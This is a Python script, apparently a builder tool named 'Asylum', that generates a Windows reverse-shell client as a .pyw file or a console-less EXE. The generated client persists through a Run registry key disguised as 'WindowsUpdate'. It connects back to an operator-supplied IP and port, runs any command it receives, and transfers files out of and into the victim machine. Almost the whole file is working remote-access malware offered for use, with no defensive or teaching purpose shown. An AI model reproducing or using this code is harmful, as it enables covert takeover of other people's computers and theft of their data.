import os
import sys
import subprocess
import shutil
from colorama import Fore, init
import pyfiglet
import os

os.system('cls' if os.name == 'nt' else 'clear')
print(Fore.RED + pyfiglet.figlet_format("Asylum"))
print(Fore.RESET)

def create_client_file(ip, port, file_type):
    client_code = f'''
import socket
import subprocess
import os
import sys
import time
import base64
import winreg
import shutil

HOST = '{ip}'
PORT = {port}

def add_to_startup():
    file_path = os.path.abspath(sys.argv[0])
    if file_path.endswith('.pyw'):
        new_file_path = file_path[:-4] + '.pyw'
        shutil.copy(file_path, new_file_path)
        file_path = new_file_path
    
    key = winreg.HKEY_CURRENT_USER
    key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    
    try:
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_ALL_ACCESS) as registry_key:
            winreg.SetValueEx(registry_key, "WindowsUpdate", 0, winreg.REG_SZ, file_path)
        print("Added to startup successfully")
    except WindowsError:
        print("Failed to add to startup")

def execute_command(command):
    try:
        if command.lower().startswith('cd '):
            new_dir = command[3:].strip()
            os.chdir(new_dir)
            return f"Changed directory to {{os.getcwd()}}"
        elif command.lower().startswith('download '):
            _, filename = command.split(' ', 1)
            return send_file(filename)
        else:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return "Command timed out after 30 seconds"
    except Exception as e:
        return str(e)

def receive_file(s, filename, size):
    data = b''
    while len(data) < size:
        packet = s.recv(size - len(data))
        if not packet:
            return "File transfer failed"
        data += packet
    with open(filename, 'wb') as f:
        f.write(base64.b64decode(data))
    return "File received successfully"

def send_file(filename):
    if not os.path.exists(filename):
        print(f"ERROR: File not found: {{filename}}")
        return f"ERROR: File not found: {{filename}}"
    with open(filename, 'rb') as f:
        data = f.read()
    print(f"File content (client side): {{data[:100]}}...")
    encoded_data = base64.b64encode(data)
    print(f"Encoded data (client side): {{encoded_data[:100]}}...")
    return f"DOWNLOAD {{filename}} {{len(encoded_data)}} {{encoded_data.decode()}}"

def start_client():
    global s
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((HOST, PORT))
                while True:
                    command = s.recv(1024).decode().strip()
                    print(f"Received command: {{command}}")
                    if command.lower() == 'exit':
                        return
                    elif command.startswith("UPLOAD"):
                        _, filename, size = command.split(' ')
                        response = receive_file(s, filename, int(size))
                    else:
                        output = execute_command(command)
                        response = output
                    print(f"Sending response: {{response[:100]}}...")
                    s.sendall(response.encode() + b"\\nEND\\n")
        except Exception as e:
            print(f"Connection lost: {{e}}")
            time.sleep(10)

if __name__ == "__main__":
    add_to_startup()
    start_client()
'''
    
    if file_type == 'pyw':
        with open('generated_client.pyw', 'w') as f:
            f.write(client_code)
        print("Python file 'generated_client.pyw' has been created.")
    elif file_type == 'exe':
        with open('temp_client.pyw', 'w') as f:
            f.write(client_code)
        try:
            subprocess.run(['pyinstaller', '--onefile', '--noconsole', 'temp_client.pyw'], check=True)
            os.remove('temp_client.pyw')
            os.rename('dist/temp_client.exe', 'generated_client.exe')
            print("EXE file 'generated_client.exe' has been created.")
        except subprocess.CalledProcessError:
            print("Error: Failed to create EXE. Make sure pyinstaller is installed.")
        finally:
            # Cleanup
            if os.path.exists('temp_client.spec'):
                os.remove('temp_client.spec')
            if os.path.exists('build'):
                shutil.rmtree('build')
            if os.path.exists('dist'):
                shutil.rmtree('dist')

def main():
    print(Fore.GREEN)
    print("Welcome to the Reverse Shell Generator!")
    print(Fore.RESET)
    while True:
        file_type = input("Do you want the output as Python (.pyw) or Executable (.exe)? Enter 'pyw' or 'exe': ").lower()
        if file_type in ['pyw', 'exe']:
            break
        print(Fore.RED)
        print("Invalid input. Please enter 'pyw' or 'exe'.")
        print(Fore.RESET)
    ip = input("Enter the server IP: ")
    port = input("Enter the server PORT: ")
    
    try:
        port = int(port)
    except ValueError:
        print("Invalid PORT. Using default port 12345.")
        port = 12345
    
    create_client_file(ip, port, file_type)

if __name__ == "__main__":
    main()
